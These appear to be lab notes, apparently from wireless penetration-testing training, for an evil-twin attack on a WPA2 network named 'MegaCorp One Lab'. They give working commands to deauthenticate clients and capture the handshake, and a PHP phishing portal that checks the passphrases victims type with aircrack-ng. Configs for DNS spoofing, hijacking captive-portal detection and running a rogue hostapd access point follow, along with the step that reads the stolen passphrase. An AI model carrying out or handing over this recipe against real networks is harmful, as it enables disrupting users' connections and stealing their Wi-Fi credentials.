# Discovery
```sh
$ sudo airmon-ng check kill
$ sudo airmon-ng start wlan0
$ sudo airodump-ng -w discovery --output-format pcap wlan0mon
<SNIP>
00:0E:08:90:3A:5F  -75        3        0    0  11  130   WPA2 CCMP   PSK  MegaCorp One Lab
```

Intercept handshake:
```sh
$ sudo aireplay-ng -0 0 -a 00:0E:08:90:3A:5F wlan0mon
CH 12 ][ Elapsed: 0 s ][ 2020-09-14 16:23 ][WPA handshake:  00:0E:08:90:3A:5F ]
```

Deface is done using something like:
```php
<?php
# Path of the handshake PCAP
$handshake_path = '/home/kali/discovery-01.cap';
# ESSID
$essid = 'MegaCorp One Lab';
# Path where a successful passphrase will be written
# Apache2's user must have write permissions
# For anything under /tmp, it's actually under a subdirectory
#  in /tmp due to Systemd PrivateTmp feature:
#  /tmp/systemd-private-$(uuid)-${service_name}-${hash}/$success_path
# See https://www.freedesktop.org/software/systemd/man/systemd.exec.html
$success_path = '/tmp/passphrase.txt';
# Passphrase entered by the user
$passphrase = $_POST['passphrase'];

# Make sure passphrase exists and
# is within passphrase lenght limits (8-63 chars)
if (!isset($_POST['passphrase']) || strlen($passphrase) < 8 || strlen($passphrase) > 63) {
  header('Location: index.php?failure');
  die();
}

# Check if the correct passphrase has been found already ...
$correct_pass = file_get_contents($success_path);
if ($correct_pass !== FALSE) {

  # .. and if it matches the current one,
  # then redirect the client accordingly
  if ($correct_pass == $passphrase) {
    header('Location: index.php?success');
  } else {
    header('Location: index.php?failure');
  }
  die();
}

# Add passphrase to wordlist ...
$wordlist_path = tempnam('/tmp', 'wordlist');
$wordlist_file = fopen($wordlist_path, "w");
fwrite($wordlist_file, $passphrase);
fclose($wordlist_file);

# ... then crack the PCAP with it to see if it matches
# If ESSID contains single quotes, they need escaping
exec("aircrack-ng -e '". str_replace('\'', '\\\'', $essid) ."'" .
" -w " . $wordlist_path . " " . $handshake_path, $output, $retval);

$key_found = FALSE;
# If the exit value is 0, aircrack-ng successfully ran
# We'll now have to inspect output and search for
# "KEY FOUND" to confirm the passphrase was correct
if ($retval == 0) {
	foreach($output as $line) {
		if (strpos($line, "KEY FOUND") !== FALSE) {
			$key_found = TRUE;
			break;
		}
	}
}

if ($key_found) {

  # Save the passphrase and redirect the user to the success page
  @rename($wordlist_path, $success_path);

  header('Location: index.php?success');
} else {
  # Delete temporary file and redirect user back to login page
  @unlink($wordlist_file);

  header('Location: index.php?failure');
}
?>
```

```sh
$ sudo ip addr add 192.168.87.1/24 dev wlan0
$ sudo ip link set wlan0 up
$ cat mco-dnsmasq.conf
# Main options
# http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
# Only listen on this address. When specifying an
# interface, it also listens on localhost.
# We don't want to interrupt any local resolution
# since the DNS responses will be spoofed
listen-address=192.168.87.1

# DHCP range
dhcp-range=192.168.87.100,192.168.87.199,12h
dhcp-lease-max=100

# DNS spoofing
# This should cover most queries
# We can add 'log-queries' to log DNS queries
address=/com/192.168.87.1
address=/org/192.168.87.1
address=/net/192.168.87.1

# Entries for Windows 7 and 10 captive portal detection
address=/dns.msftncsi.com/131.107.255.255

$ sudo dnsmasq --conf-file=mco-dnsmasq.conf
$ sudo tail /var/log/syslog | grep dnsmasq
$ sudo netstat -lnp # check for 53 for DNS and 67 for DHCP
```

Sometimes clients ignore DNS settings provided in the DHCP lease, and we will use an nftables5 rule to force redirect all DNS requests (UDP to 53 only - TCP 53 is for zone transfer) back to our server.
```sh
$ sudo nft add table ip nat
$ sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
$ sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
```

Add to `/etc/apache2/sites-enabled/000-default.conf` before the VirtualHost closing tag:
```
 # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 http://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt http://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt http://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L]

</VirtualHost>
```

For `RewriteCond` and `RewriteRule` we need these:
```sh
$ sudo a2enmod rewrite
$ sudo a2enmod alias
```

# Special case for Chrome
```
<VirtualHost *:443>

  ServerAdmin webmaster@localhost
  DocumentRoot /var/www/html

  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 https://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt https://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt https://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L]

  # Use existing snakeoil certificates
  SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem
  SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
</VirtualHost>
```

```sh
$ sudo a2enmod ssl
$ sudo systemctl restart apache2
```

`hostapd` to run the AP:
```
interface=wlan0
ssid=MegaCorp One Lab
channel=11

# 802.11n
hw_mode=g
ieee80211n=1

# Uncomment the following lines to use OWE instead of an open network
#wpa=2
#ieee80211w=2
#wpa_key_mgmt=OWE
#rsn_pairwise=CCMP
```

`$ sudo hostapd -B mco-hostapd.conf`

Set the IP, either before or after starting hostapd. Must be be done before any client connects (otherwise the DHCP won't work).
```sh
$ sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)' # monitor this
Aug 25 15:49:20 kali hostapd: wlan0: STA 00:c4:98:12:65:1d IEEE 802.11: associated (aid 1)
Aug 25 15:49:21 kali dnsmasq-dhcp[18135]: DHCPACK(wlan0) 192.168.87.118 00:c4:98:12:65:1d android-8e6f8d2da38952aa
```

```sh
$ sudo tail -f /var/log/apache2/access.log # monitor this too
192.168.87.118 - - [25/Aug/2020:15:49:57 -0400] "GET /portal/index.php?success HTTP/1.1" 200 413 "http://192.168.87.1/portal/index.php" "Mozilla/5.0 (Linux; Android 9) AppleWebKit/497.88 (KHTML, like Gecko) Version/4.0 
```

```sh
$ sudo find /tmp/ -iname passphrase.txt
# and then cat
```
